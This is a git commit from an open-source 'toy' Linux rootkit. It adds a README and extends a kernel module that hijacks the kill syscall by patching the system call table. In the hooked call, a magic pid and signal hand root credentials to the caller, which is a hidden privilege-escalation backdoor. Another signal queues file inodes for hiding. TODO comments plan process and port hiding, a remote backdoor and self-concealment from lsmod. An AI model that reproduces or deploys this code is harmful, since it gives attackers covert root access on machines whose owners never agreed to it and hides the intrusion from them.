d0d47781e9fcfe5e02e6b31fba41c3b4edcfb6ec
Josh Imhoff <joshimhoff13@gmail.com>
2013-04-16 15:14:12 -0400

    Adds linked list of inodes to hide

---
+++ README.md
@@ -0,0 +1,3 @@
+#Toykit -- a toy Linux rootkit
+
+Work in progress. Use at your own risk -- dangerous code.
--- rootkit.c
+++ rootkit.c
@@ -5,17 +5,22 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/init.h>
+#include <linux/slab.h>
+#include <linux/list.h>
 
 // TODO 
-// Hide files, processes, and ports
-// Remote backdoor
+// Hide files
+// Hide processess
+// Hide ports and add remote backdoor
 // Hide self from lsmod and other commands
-// Rootkit should find the sys_call_table programmatically
-// Bash script to automate infecting system?
+// Find the sys_call_table programmatically
 
 // for local backdoor
 #define LOCAL_PID 12345
 #define LOCAL_SIG 31
+
+// for controlling the file hider
+#define HIDE_SIG 16
 
 // for writing to sys_call_table
 #define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
@@ -26,9 +31,19 @@ unsigned long *sys_call_table = (unsigned long*)0xc15b0000;  // hard coded, grep
 typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig); // for casting to avoid warnings
 kill_ptr orig_kill;
 
+static LIST_HEAD(hidden_files); // list of inodes to hide
+
+struct hidden_file { // struct for list of inodes
+	int inode;
+	struct list_head list;
+};
+
 asmlinkage int hacked_kill(pid_t pid, int sig)
 {
 	int actual_result;
+	struct hidden_file *toAdd;
+
+	// kill backdoor
 	if (pid == LOCAL_PID && sig == LOCAL_SIG) {
 		struct cred *cred;
 		cred = (struct cred *)__task_cred(current);
@@ -40,6 +55,14 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 		cred->egid = 0;
 		cred->fsuid = 0;
 		cred->fsgid = 0;
+		return 0;
+	}
+	// file hiding, pid = inode of file to be hidden
+	else if (sig == HIDE_SIG) { 
+		toAdd = kmalloc(sizeof(struct hidden_file),GFP_KERNEL);
+		toAdd->inode = pid;
+		INIT_LIST_HEAD(&toAdd->list);
+		list_add_tail(&toAdd->list,&hidden_files);
 		return 0;
 	}
 
@@ -57,9 +80,19 @@ int rootkit_init(void) {
 }
 
 void rootkit_exit(void) {
+	struct hidden_file *ptr, *next;
+	list_for_each_entry(ptr,&hidden_files,list) {
+		printk(KERN_INFO "Inode: %d\n",ptr->inode);
+	}
+
 	GPF_DISABLE;
 	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
 	GPF_ENABLE;
+
+	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
+		list_del(&ptr->list);
+		kfree(ptr);
+	}
 	printk(KERN_INFO "Removing rootkit\n");
 }
 
@@ -67,5 +100,5 @@ module_init(rootkit_init);
 module_exit(rootkit_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Rootkit");
+MODULE_DESCRIPTION("Toykit");
 MODULE_AUTHOR("Josh Imhoff");
